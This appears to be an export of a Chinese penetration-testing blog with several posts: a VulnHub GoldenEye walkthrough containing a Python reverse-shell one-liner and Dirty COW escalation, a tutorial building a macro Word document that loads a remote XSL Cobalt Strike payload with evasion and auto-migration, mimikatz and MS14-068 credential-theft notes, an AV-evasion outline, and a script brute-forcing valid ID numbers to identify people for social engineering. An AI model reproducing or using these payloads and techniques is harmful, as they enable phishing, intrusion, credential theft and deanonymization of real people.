<h3 id="0x13-各类常用-C2-渗透-框架"><a href="#0x13-各类常用-C2-渗透-框架" class="headerlink" title="0x13 各类常用 C2 / 渗透 框架"></a>0x13 各类常用 C2 / 渗透 框架</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CobaltStrike [二次开发]</span><br><span class="line">  payload(beacon) 逆向/改进重写</span><br><span class="line">Metasploit [二次开发]</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<h3 id="0x14-各类常用-Webshell管理工具"><a href="#0x14-各类常用-Webshell管理工具" class="headerlink" title="0x14 各类常用 Webshell管理工具"></a>0x14 各类常用 Webshell管理工具</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">菜刀	caidao20160622</span><br><span class="line">冰蟹	Behinder_v2.0.1</span><br><span class="line">蚁剑	AntSword</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<h3 id="0x15-免杀-及-各类防火墙对抗"><a href="#0x15-免杀-及-各类防火墙对抗" class="headerlink" title="0x15 免杀 及 各类防火墙对抗"></a>0x15 免杀 及 各类防火墙对抗</h3><ul>
<li><p>静态</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">混淆:</span><br><span class="line">手工混淆,有源码的情况下,尝试逐个替换可能是关键特征字符串的 命名空间名, 函数名, 变量名, 字符串 等等等....</span><br><span class="line">工具混淆,针对各种语言的专业混淆工具 [ 有商业版 ]</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">加壳:</span><br><span class="line">一些常用公开壳的实际效果可能并不是太好 [ 也有商业壳 ]</span><br><span class="line">最好的方式还是尝试自己写壳,就是成本较高</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
<li><p>动态</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">反射</span><br><span class="line">shellcode 内存加解密执行 ( 对于现在的某些杀软来讲,可能并没什么卵用,别人拦的基本都是你的最终调用 )</span><br><span class="line">白利用</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">注:</span><br><span class="line">   理论上, 这些应该也没有什么非常通用的方法</span><br><span class="line">   大多还是事先针对特定的杀软针对性的不停调试分析出它到底怎么拦,怎么查的,然后再针对性的对症下药</span><br></pre></td></tr></table></figure>
</li>
<li><p>流量:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">域前置[利用大厂cdn]</span><br><span class="line">DNS加密隧道</span><br><span class="line">第三方公共邮箱上线</span><br><span class="line">第三方网盘上线</span><br><span class="line">第三方社交网站上线</span><br><span class="line">第三方匿名社交工具上线[eg: tg机器人,tor...]</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h5 id="最后的知识星球图片我就不传了，作者微信公众号“红队攻防揭秘”里有"><a href="#最后的知识星球图片我就不传了，作者微信公众号“红队攻防揭秘”里有" class="headerlink" title="最后的知识星球图片我就不传了，作者微信公众号“红队攻防揭秘”里有"></a>最后的知识星球图片我就不传了，作者微信公众号“红队攻防揭秘”里有</h5>]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>备战OSCP_GoldenEye1</title>
    <url>/2020/06/09/%E5%A4%87%E6%88%98OSCP_GoldenEye1/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近比较闲，做一做靶场，让我这个菜鸡感受一下自己到底有多菜<br><a href="https://www.vulnhub.com/entry/goldeneye-1,240/" target="_blank" rel="noopener">靶场地址</a><br><img src="https://i.loli.net/2020/06/09/as8tbgMfpdoh1TR.png" alt="Image 70.png"></p><a id="more"></a>
<h3 id="发现靶机"><a href="#发现靶机" class="headerlink" title="发现靶机"></a>发现靶机</h3><p><img src="https://i.loli.net/2020/06/09/KPAcWxaV8umhHZO.png" alt="3.png"><br>目标IP：192.168.110.129</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>nmap信息<br><img src="https://i.loli.net/2020/06/09/4yVHdhFqnz629gU.png" alt="1.png"></p>
<p>目录扫描信息<br>Dirsearch扫描80未发现什么目录<br><img src="https://i.loli.net/2020/06/09/r9oJDCsLqA6IGNO.png" alt="2.png"></p>
<h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><p>在主页显示/sev-home/目录可以登录<br><img src="https://i.loli.net/2020/06/09/ugRVSysLmBWHJTp.png" alt="22.png"></p>
<p>打开目录发现需要凭证<br><img src="https://i.loli.net/2020/06/09/5NoCaAGstf3THhL.png" alt="ddd.png"></p>
<p>查看页面源码发现有个terminal.js，跟进发现密文和俩人名<br><img src="https://i.loli.net/2020/06/09/bHoLDIOK89paCdW.png" alt="333.png"></p>
<p>密文解密为：<br><img src="https://i.loli.net/2020/06/09/qylv5D9cHUnwIox.png" alt="323.png"></p>
<p>登录进去就发现这个页面（账号密码这卡了好久，后来发现是tm小写，boris/InvincibleHack3r）<br><img src="https://i.loli.net/2020/06/09/KOe7m9zRrxunBsg.png" alt="222222.png"></p>
<p>根据提示，Hydra爆破pop3服务发现两个账户密码：boris/secret1! ，natalya/bird<br><img src="https://i.loli.net/2020/06/09/KZdCng7VpW9hcUQ.png" alt="34343.png"></p>
<p>google一下可以用telnet，尝试连接pop3，boris里面没啥重要的东西，在natalya里面找到了一个域名和账号密码<br><img src="https://i.loli.net/2020/06/09/cRWVEeqxd87jaZ9.png" alt="dadsda.png"><br><img src="https://i.loli.net/2020/06/09/BgU3pSIvKzVjiYk.png" alt="sadasd.png"></p>
<p>根据提示，修改/etc/hosts，指定IP和域名<br><img src="https://i.loli.net/2020/06/09/fDoCIQqeM3yOjBu.png" alt="asdsadasdsa.png"></p>
<p>用上面的给出的账号密码，登录 severnaya-station.com/gnocertdir 后，找到一个消息，里面指出了一个叫doak的运营主管。<br><img src="https://i.loli.net/2020/06/09/nKXkg32YTIZFr4p.png" alt="dsadasdas.png"></p>
<p>再次hydra爆破doak的密码<br><img src="https://i.loli.net/2020/06/09/pk2u741XoRM38vt.png" alt="dasdas.png"></p>
<p>telnet登录，查看邮件内容：<br><img src="https://i.loli.net/2020/06/09/YDQxKtBwlnV1Mgu.png" alt="dsadasdasa.png"></p>
<p>使用给出的账号密码，登录系统，进去看到一个s3cret.txt的文件<br><img src="https://i.loli.net/2020/06/09/65YevOT14VwDuKx.png" alt="xzc.png"></p>
<p>其内容指向一个图片路径<br><img src="https://i.loli.net/2020/06/09/vTxUjIBMSYg9c3N.png" alt="wwww.png"></p>
<p>就真的是个图片<br><img src="https://i.loli.net/2020/06/09/jdySRc9OxlBZ1me.png" alt="bbbb.png"></p>
<p>在图片属性中有一个base64编码<br><img src="https://i.loli.net/2020/06/09/z48qUuB3IDpSrl1.png" alt="sadadasdasd.png"></p>
<p>解出来为<br><img src="https://i.loli.net/2020/06/09/gYQBukmoRVrGPpO.png" alt="dasdasd.png"></p>
<p>根据上文s3cret.txt的内容，猜测应该是adm1n的密码<br>结果，吐了，不是adm1n的，是admin的<br><img src="https://i.loli.net/2020/06/09/LuD15l8IBt2ykX9.png" alt="dasdasdas.png"></p>
<p>进去之后没发现啥有用的，看了一下答案说要找cms的漏洞：moodle 2.2.3<br>Google之后发现metasploit有rce脚本。<br><img src="https://i.loli.net/2020/06/09/HUAY3En9sxtGCdo.png" alt="asdasdasd.png"></p>
<p>需要添加一下密码，域名和目录<br><img src="https://i.loli.net/2020/06/09/VtbfXDjaocOWNmJ.png" alt="dsadas.png"></p>
<p>试了好几遍失败了，查了资料才知道要改东西<br>到这个目录里面把拼写引擎改为Pspellshell<br><img src="https://i.loli.net/2020/06/09/H9eB4F7tgb3n6mf.png" alt="dsadasdas.png"></p>
<p>浪费大家时间了，又失败了，没找到原因，看了别人的wp，试试另外一个方法<br>第一步：<br>在目录下写入python反弹shell的脚本<br><img src="https://i.loli.net/2020/06/09/3UFRq8SLQPCAtYN.png" alt="ykk.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.110.128&quot;,65530));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>

<p>第二步：<br>将下面改为PspellShell<br><img src="https://i.loli.net/2020/06/09/vo1Ll4TaGmKf7FM.png" alt="dasdasd.png"></p>
<p>第三步：<br>Kali上开启监听<br><img src="https://i.loli.net/2020/06/09/4NKPQpwqTGFEdOf.png" alt="dasdasd.png"></p>
<p>第四步：<br>在对应Blogs下add a new entry，填点东西，然后点击最后一个ABC的按钮<br><img src="https://i.loli.net/2020/06/09/KlUL3iN2SPcF1bR.png" alt="sdasadasdas.png"></p>
<p>成功getshell<br><img src="https://i.loli.net/2020/06/09/nMW6FyTpKqxUhSe.png" alt="dfffff.png"></p>
<p>获取一个tty的shell<br><img src="https://i.loli.net/2020/06/09/LxCOhafQTGZz5w6.png" alt="wwwwwww.png"></p>
<h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p>低权限：<br><img src="https://i.loli.net/2020/06/09/ASNdu653nIvCfKo.png" alt="dasdasd.png"></p>
<p>看了一圈suid没发现可以利用的<br>内核提权吧<br>先wget一个提权脚本到靶机的tmp目录下<br>然后执行发现可用脏牛提权cve-2016-5195<br><img src="https://i.loli.net/2020/06/09/C1St4YnhLuVwURa.png" alt="dsadas.png"></p>
<p>把脏牛wget到靶机<br><img src="https://i.loli.net/2020/06/09/w9sJGW26xMQDhyY.png" alt="dddd.png"></p>
<p>编译一下，发现没有gcc，但是有cc<br><img src="https://i.loli.net/2020/06/09/nc7SYU4yzq9lGFv.png" alt="adsadasddasdsadas.png"></p>
<p>成功获取root<br><img src="https://i.loli.net/2020/06/09/32YicxnvHZTJCAI.png" alt="dsadas.png"></p>
<p>找flag<br><img src="https://i.loli.net/2020/06/09/oSHuUp6Fyhk9VX2.png" alt="dasas.png"><br><img src="https://i.loli.net/2020/06/09/rAD5gUMOIpfXJ3E.png" alt="sssss.png"></p>
<p>结束<br><img src="https://i.loli.net/2020/06/09/UYKbVIouv1jMBxQ.png" alt="ddddd.png"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>GoldenEye这个靶场脑洞着实有点大，很多细节点稍有不注意或没想到就会卡很久，这个靶场做下来我大概花了3、4天，其中断过好几次，也有好几次想放弃了，但是坚持一下也做完了，舒服</p>
]]></content>
      <tags>
        <tag>OSCP</tag>
      </tags>
  </entry>
  <entry>
    <title>远程加载XSL文件达到免杀并增加文档迷惑性</title>
    <url>/2020/04/10/%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDXSL%E6%96%87%E4%BB%B6%E8%BE%BE%E5%88%B0%E5%85%8D%E6%9D%80%E5%B9%B6%E5%A2%9E%E5%8A%A0%E6%96%87%E6%A1%A3%E8%BF%B7%E6%83%91%E6%80%A7/</url>
    <content><![CDATA[<p>从uknow师傅这看到的，自己动手做了一遍记录一下。原文在<a href="https://uknowsec.cn/posts/notes/%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8BXSL%E6%96%87%E4%BB%B6%E7%9A%84%E5%AE%8F%E5%85%8D%E6%9D%80%E6%96%B9%E6%B3%95.html" target="_blank" rel="noopener">这里</a></p><a id="more"></a>
<p>在本文中删除了uknow师傅通过编辑宏来触发上线的哪一段，经过试验，个人觉得其后面一部分实用性强一点。遂保留记录。</p>
<h3 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h3><p>首先使用Cobalt Strike或者Metasploit生成二进制格式的shellcode，即后缀为bin的文件。<br>此处以CS为例：</p>
<p><img src="https://i.loli.net/2020/04/10/8C9762cBgzAf4Fr.png" alt="Image 1.png"></p>
<h3 id="处理payload"><a href="#处理payload" class="headerlink" title="处理payload"></a>处理payload</h3><p>因为SharpShooter要求shellcode中不能含有空字节。所以使用msfvenom对payload.bin进行处理生成shellcode-encoded.bin文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-encoded.bin -b &quot;\x00&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/04/10/iQ5RjdSMas7hFqJ.png" alt="Image 3.png"></p>
<h3 id="生成xsl和macro"><a href="#生成xsl和macro" class="headerlink" title="生成xsl和macro"></a>生成xsl和macro</h3><p>将<a href="https://github.com/mdsecactivebreach/SharpShooter" target="_blank" rel="noopener">SharpShooter</a>下载到本地然后安装好依赖，建议使用python2安装</p>
<p>将shellcode-encoded.bin文件放置脚本同目录下</p>
<p>使用如下命令生成xsl文件和macro文件（需要修改vps地址）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SharpShooter.py --stageless --dotnetver 4 --payload macro --output foo --rawscfile shellcode-encoded.bin --com xslremote --awlurl http://*.*.*.*:8080/foo.xsl</span><br></pre></td></tr></table></figure>
<p>简单介绍一下上面的几个参数：</p>
<ul>
<li>dotnetver：为目标的.net版本，可选2或者4</li>
<li>awlurl： 为xsl存放地址</li>
</ul>
<p><img src="https://i.loli.net/2020/04/10/2CGjrJKfUYT38W5.png" alt="Image 5.png"></p>
<p>生成的foo.macro内容大致如下：</p>
<p><img src="https://i.loli.net/2020/04/10/9EjfVMCztrQ2TFi.png" alt="Image 6.png"></p>
<p>生成的foo.xsl内容大致如下：</p>
<p><img src="https://i.loli.net/2020/04/10/4EBGrJ3Hb2fp7OY.png" alt="Image 7.png"></p>
<h3 id="迷惑性处理"><a href="#迷惑性处理" class="headerlink" title="迷惑性处理"></a>迷惑性处理</h3><p>将foo.xsl文件上传至vps，并开启http服务</p>
<p><img src="https://i.loli.net/2020/04/10/L1KynkS2IvXmMDj.png" alt="Image 8.png"></p>
<p>新建一个 启用宏的Word文档 ，进入开发工具，选择旧式控件 — 其他控件 — Microsoft RDP Client Control *（文章中使用的是version 2）</p>
<p><img src="https://i.loli.net/2020/04/10/qsL3fIoN6urG8ed.png" alt="Image 15.png"></p>
<p><img src="https://i.loli.net/2020/04/10/aH73KhRABXdyoCI.png" alt="Image 16.png"></p>
<p>右键属性，将server值填为localhost，将StartConnection值填为1，即点开自启动</p>
<p><img src="https://i.loli.net/2020/04/10/SXvtBiUxMW3RuLO.png" alt="Image 9.png"></p>
<p>再右键查看代码，将foo.macro中间部分的代码填入其中</p>
<p><img src="https://i.loli.net/2020/04/10/L7YGtK6QcAueWBg.png" alt="Image 17.png"></p>
<p>如下图所示：</p>
<p><img src="https://i.loli.net/2020/04/10/UFbhyoce8MnQLZK.png" alt="Image 10.png"></p>
<p>保存后再次打开，可以看到已经显示为 “部分活动内容已被禁用” </p>
<p><img src="https://i.loli.net/2020/04/10/6xtpGIT83Fd4qyB.png" alt="Image 11.png"></p>
<p>若点击启用内容，即可看到已经上线。</p>
<h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><p>虽然上线成功，但是可以注意到上一下会就掉线了，按uknow老哥文章所说：office宏加载远程的.xsl文件有个缺点就是，点击启用宏后word进程会崩掉，如word进程被结束了，Cobalt Strike或者Metasploit会掉线。</p>
<p>所以这里需要进行自动进程迁移。<br>处理方法：</p>
<ul>
<li>Cobalt Strike：通过插件实现上线后自动迁移进程， <a href="https://github.com/threatexpress/aggressor-scripts/tree/d6bdbd587379d7da2a337d19cccdee1a8628d1d8/beacon_handler" target="_blank" rel="noopener">Beacon Handler Suite</a></li>
<li>Metasploit: 在设置监听的时间可以设置：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set autorunscript migrate -N explorer.exe 或 set autorunscript -f</span><br></pre></td></tr></table></figure>

<p>这样可以实现在word进程被关闭后，得到一个新的会话，即持久的控制目标。</p>
<p>将beacon_handler文件下载下来后，修改init.cna中第37行为true，开启beacon自动进程迁移，其他的看着改吧。（我这里还改了sleep时间）</p>
<p><img src="https://i.loli.net/2020/04/10/sMrVwBc4PC8GRk7.png" alt="Image 18.png"></p>
]]></content>
      <tags>
        <tag>钓鱼</tag>
      </tags>
  </entry>
  <entry>
    <title>微博爬取用户oid</title>
    <url>/2020/03/23/%E5%BE%AE%E5%8D%9A%E7%88%AC%E5%8F%96%E7%94%A8%E6%88%B7oid/</url>
    <content><![CDATA[<h3 id="微博爬取用户oid脚本"><a href="#微博爬取用户oid脚本" class="headerlink" title="微博爬取用户oid脚本"></a>微博爬取用户oid脚本</h3><a id="more"></a><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line">from requests.exceptions import RequestException</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Get_Html_Text(url):</span><br><span class="line">    try:</span><br><span class="line">        headers = &#123;&apos;User-Agent&apos; : &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0&apos;&#125;</span><br><span class="line">        response = requests.get(url, headers=headers)</span><br><span class="line">        if response.status_code == 200:</span><br><span class="line">            return response.text</span><br><span class="line">        return None</span><br><span class="line">    except RequestException:</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Re_Html_Oid(html):</span><br><span class="line">    OID = re.findall(r&apos;href=\&quot;https:\/\/weibo.cn\/u\/(.*?)\&quot;&apos;, html)</span><br><span class="line">    return OID</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write_to_file(content):</span><br><span class="line">    with open(&apos;oid_result.txt&apos;, &apos;a&apos;, encoding=&apos;utf-8&apos;) as f:</span><br><span class="line">        f.write(json.dumps(content, ensure_ascii=False) + &apos;\n&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main(cla,page):</span><br><span class="line">    url = &apos;https://weibo.cn/pub/top?cat=&apos;+ str(cla)+&apos;&amp;page=&apos; + str(page)</span><br><span class="line">    html = Get_Html_Text(url)</span><br><span class="line">    #print (html)</span><br><span class="line">    for oid in Re_Html_Oid(html):</span><br><span class="line">        print(oid)</span><br><span class="line">        write_to_file(oid)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    list1 = [&apos;star&apos;,&apos;grass&apos;,&apos;content&apos;,&apos;media&apos;]</span><br><span class="line">    for j in list1:</span><br><span class="line">        for i in range(1,11):</span><br><span class="line">            main(cla = j,page = i)</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line"></span><br><span class="line">#运行前先删除oid_result.txt</span><br><span class="line">#start,grass,content,media</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python做身份证合法性验证</title>
    <url>/2020/01/15/Python%E5%81%9A%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%90%88%E6%B3%95%E6%80%A7%E9%AA%8C%E8%AF%81/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>发现一个好玩的<a href="https://zhuanlan.zhihu.com/p/101334480" target="_blank" rel="noopener">文章</a>， 文章中通过time模块遍历某一年份的所有日期，再根据身份证前6位和后4位以及id_validator模块来筛选出合法的身份证号。以后社工的时候可能用得到。</p><a id="more"></a>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import time</span><br><span class="line">from id_validator import validator</span><br><span class="line"></span><br><span class="line">#生成出生当年所有日期</span><br><span class="line">def dateRange(year):</span><br><span class="line">    fmt = &apos;%Y-%m-%d&apos;</span><br><span class="line">    bgn = int(time.mktime(time.strptime(year+&apos;-01-01&apos;,fmt)))</span><br><span class="line">    end = int(time.mktime(time.strptime(year+&apos;-12-31&apos;,fmt)))</span><br><span class="line">    list_date = [time.strftime(fmt,time.localtime(i)) for i in range(bgn,end+1,3600*24)]</span><br><span class="line">    return [i.replace(&apos;-&apos;,&apos;&apos;) for i in list_date]</span><br><span class="line"></span><br><span class="line">#遍历所有日期，print通过校验的身份证号码</span><br><span class="line">def vali_dator(id1,id2,id3):</span><br><span class="line">    for i in dateRange(id2):</span><br><span class="line">        theid = id1 + i + id3</span><br><span class="line">        if validator.is_valid(theid):</span><br><span class="line">            print(theid)</span><br><span class="line"></span><br><span class="line">vali_dator(&apos;身份证前6位&apos;,&apos;年份&apos;,&apos;身份证后4位&apos;)</span><br></pre></td></tr></table></figure>

<h2 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h2><p>利用“身份证前6位”，“年份”，“身份证后4位”来筛选出包含“日期”的完整、合法的身份证号码。再利用姓名和阿里的身份验证接口，可以找到“某人”对应的“身份证号”和“大头贴”</p>
<p>ps:不愿意花钱买阿里接口，也可以使用文章中说的，利用“12306”添加常用联系人的方式，来一个个匹配出“某人”和他的身份证号（12306添加联系人时，如果姓名和身份证号匹配不上会报检验不通过）</p>
]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>关于前一篇文章的mimikatz后续研究</title>
    <url>/2020/01/10/%E5%85%B3%E4%BA%8E%E5%89%8D%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E7%9A%84mimikatz%E5%90%8E%E7%BB%AD%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/01/10/7DEoQwHk8n2Ud9j.png" alt="Image 33.png"></p><p>此处有一处错误，今天发现的另外一种情况，今天演示的时候，发现依旧不能成功访问域控共享目录，然后排错发现，原来是使用了system权限的mimikatz。</p><a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::list： 列出在用户的内存中所有用户的票证（TGT 和 TGS）。不需要特殊的权限，因为它仅显示当前用户的票证。与 “klist” 的功能相似。</span><br></pre></td></tr></table></figure>

<p>在使用域普通用户伪造的凭证注入时，应当使用该域普通账户权限的mimikatz注入，而不应该使用system权限的mimikatz来注入。是因为system权限的mimikatz注入时，会把凭证注入到system的内存中，而不是域普通用户的内存中，所以才会失败。</p>
<p><img src="https://i.loli.net/2020/01/10/DaOuRyMKV5wkcfv.jpg" alt="3.jpg"></p>
<p>这张图是system权限下的mimikatz查看到的凭证，发现内存中只有一个凭证，也就是被注入的凭证</p>
<p><img src="https://i.loli.net/2020/01/10/VfDT4nM6BLKSPt8.jpg" alt="2.jpg"></p>
<p>而这张图是同一时间，域普通用户权限下的mimikatz查看到的凭证列表，显示有3个凭证，这明显就不同了。所以根据上面kerberos::list命令的说明，猜测“<strong>不同用户权限下的mimikatz所操作的内存是不同的</strong>”不敢确定所有的命令是这样，但是至少kerberos::模块或者“kerberos::list”、“kerberos::purge”、“kerberos::ptc”是这样的。</p>
<hr>
<p>另外还发现一个有意思的东西，那就是“注销”会清除/释放内存。<br>当在实验mimikatz抓取密码/hash的时候发现，只能抓到当前用户的密码/hash。多次实验发现依旧如此，并不能抓取到其他登陆过但是现在已注销用户的密码/hash（除了 机器名$ 用户）</p>
<p>实验步骤如下：</p>
<p>使用administrator用户登录，然后procdump出内存文件。</p>
<p><img src="https://i.loli.net/2020/01/10/TaXuCMQA69m8ldg.png" alt="Image 27.png"></p>
<p>然后将文件放置物理机dump解密。如图所示，可以看到只有机器名$和administrator的密码和hsah</p>
<p><img src="https://i.loli.net/2020/01/10/gxZrwGo3qiRN7K2.png" alt="Image 31.png"></p>
<p>随后点击注销，登录本地普通用户ding，重复同样步骤dump出内存文件。（其中因为procdump需要权限，所以用1388提权到system了。）</p>
<p><img src="https://i.loli.net/2020/01/10/y6sVgfWnou1tpUz.png" alt="Image 28.png"></p>
<p>拉到物理机解一下，可以看到这次的结果只有机器名$和ding用户的密码和hsah。</p>
<p><img src="https://i.loli.net/2020/01/10/ZpalWBLYMN1bAkF.png" alt="Image 32.png"></p>
<p>到这里就可以看出来了，注销是会把administrator用户的内存释放，这样下次使用其他用户抓密码的时候就抓不到administrator用户的hsah了。</p>
<p>下面做一个对比实验，这次不注销换成在任务管理器-&gt;用户 窗口中断开连接（或者在菜单不点击注销，点击切换用户），从而达到切换用户的目的。</p>
<p><img src="https://i.loli.net/2020/01/10/5IVBM8pjiEfGKXs.png" alt="Image 34.png"></p>
<p>这一次同样dump出内存文件，拉到本地解，结果如下</p>
<p><img src="https://i.loli.net/2020/01/10/GgyMvQrob6mh3At.png" alt="Image 35.png"></p>
<p>可以看到，在不注销的情况下，成功在内存中读取到了administrator和ding的密码。</p>
<p>所以，从防御的角度讲，运维人员能注销的就注销吧，这样可以避免被抓到关键账号的hash和密码，防止更大的风险产生。</p>
]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>MS14-068排错笔记</title>
    <url>/2020/01/09/MS14-068%E6%8E%92%E9%94%99+%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几天在研究MS14-068域普通用户提权的问题，自己搭建了域环境，使用普通域用户死活提不上权限。现在终于解决了，所以把研究过程记一下。</p><a id="more"></a>
<h2 id="问题：mimikatz导入凭证后依然“拒绝访问”域控文件"><a href="#问题：mimikatz导入凭证后依然“拒绝访问”域控文件" class="headerlink" title="问题：mimikatz导入凭证后依然“拒绝访问”域控文件"></a>问题：mimikatz导入凭证后依然“拒绝访问”域控文件</h2><h3 id="可能点一：mimikatz将凭证注入内存不成功"><a href="#可能点一：mimikatz将凭证注入内存不成功" class="headerlink" title="可能点一：mimikatz将凭证注入内存不成功"></a>可能点一：mimikatz将凭证注入内存不成功</h3><p>mimikatz在注入凭证后，使用”kerberos::list”看一下是否当前凭证只有一个，若只有一个则说明注入成功。<br>若有多个，如下图所示：<br><img src="https://i.loli.net/2020/01/09/Dx3HdOJXvgQLSUe.png" alt="Image 10.png"><br>则说明伪造的凭证“可能”注入成功，但是后续访问域控共享文件“任然”可能失败。<br>若一个都没有，”kerberos::list”为空，则说明凭证注入失败，则需要多试几次，或者使用更高级权限的mimikatz注入试试<br><img src="https://i.loli.net/2020/01/09/etgNC2fjWMI6Zv7.png" alt="Image 11.png"></p>
<h3 id="可能点二：域控未安装“域证书服务”（这次失败点就在于此）"><a href="#可能点二：域控未安装“域证书服务”（这次失败点就在于此）" class="headerlink" title="可能点二：域控未安装“域证书服务”（这次失败点就在于此）"></a>可能点二：域控未安装“域证书服务”（这次失败点就在于此）</h3><p>因为是新手，对域控环境搭建不是很熟悉，所以我在搭建域控环境的时候，只安装了“域服务”和“DNS服务”（如下图红框所示），并未在意“AD证书服务”的安装（如下图箭头所示）。经过后续尝试才发现需要安装这个服务，才能成功进入域控文件共享。<br><img src="https://i.loli.net/2020/01/09/i4FLAyTIpCGkWRz.png" alt="Image 12.png"></p>
<h2 id="MS14-068漏洞复现"><a href="#MS14-068漏洞复现" class="headerlink" title="MS14-068漏洞复现"></a>MS14-068漏洞复现</h2><p>MS14-068漏洞可以将一个普通域用户提升到域管权限，从而进行后续的横向渗透，该漏洞有几个必要条件：</p>
<ul>
<li>域控上无KB3011780补丁</li>
<li>拥有一台域内机器的控制权限</li>
<li>拥有一个域账户的SID、账号、密码/hash</li>
</ul>
<h3 id="工具下载："><a href="#工具下载：" class="headerlink" title="工具下载："></a>工具下载：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ms14-068.exe 下载地址: https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</span><br><span class="line"></span><br><span class="line">PSexec 下载地址: https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe</span><br><span class="line"></span><br><span class="line">mimikatz 下载地址: https://github.com/gentilkiwi/mimikatz/releases</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>获取普通域用户SID:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami /user</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/01/09/bOD34qn8CPYRrjk.png" alt="Image 13.png"></p>
<p>获取域控主机名/IP地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &quot;Domain controllers&quot; /domain</span><br><span class="line">********</span><br><span class="line">ping 主机名</span><br></pre></td></tr></table></figure>

<p>注意不要带$符号</p>
<p><img src="https://i.loli.net/2020/01/09/C8m2XV63IKjzMtd.png" alt="Image 14.png"></p>
<p>测试是否可以访问域控共享文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir \\域控主机名.域名\c$</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/01/09/SUmtaoL2AQMR5ZD.png" alt="Image 16.png"></p>
<p>可以看到显示“拒绝访问”，这是正常，域普通用户当然没有权限访问域控共享文件，现在我们需要使用MS14-068提权。</p>
<p><img src="https://i.loli.net/2020/01/09/mBG8LKohAZfrERI.png" alt="Image 18.png"></p>
<p>MS14-068需要几个必要的参数，SID、域用户名、域控地址，另外还需要密码，若没有密码可以使用–rc4来使用hsah生成凭证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">S14-068.exe -u test1@testaa.com -s S-1-5-21-1054765563-66723455-3431114319-1104 -d WIN-GPBP3K667HC.testaa.com -p X*******</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/01/09/fD958LTjwCUNvJq.png" alt="Image 19.png"></p>
<p>进入mimikatz</p>
